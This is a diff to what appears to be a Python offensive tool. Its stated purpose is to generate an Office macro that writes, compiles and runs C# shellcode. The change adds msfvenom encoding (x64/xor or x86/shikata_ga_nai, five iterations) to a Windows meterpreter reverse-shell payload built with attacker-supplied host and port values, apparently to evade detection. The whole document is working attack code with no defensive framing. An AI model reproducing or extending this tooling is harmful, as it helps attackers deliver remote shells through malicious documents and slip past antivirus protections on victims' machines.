@@ -51,10 +51,13 @@ def injectNiceness(script, nicenessFile, outfile):
 def createNiceness(arch, protocol, lhost, lport, single, outfile):
     msfCall = 'msfvenom'
     msfPayload = 'windows/'
+    encoder = ''
 
     if arch == 'x64':
         msfPayload += 'x64/'
-
+        encoder = 'x64/xor'
+    else:
+        encoder = 'x86/shikata_ga_nai'
     if single == True:
         msfPayload += 'meterpreter_reverse_' + protocol
     else:
@@ -66,7 +69,7 @@ def createNiceness(arch, protocol, lhost, lport, single, outfile):
     msfFormat = "num"
     msfOut = outfile
 
-    subprocess.check_output([msfCall, '-p', msfPayload, msfLhost, msfLport, '-f', msfFormat, '-o',msfOut])
+    subprocess.check_output([msfCall, '-p', msfPayload, msfLhost, msfLport, '-f', msfFormat, '-e', encoder, '-i', '5', '-o',msfOut])
 
 if __name__== "__main__":
     parser = argparse.ArgumentParser(description='Generate Office Macro that writes, compiles, and runs a C# shell code program')
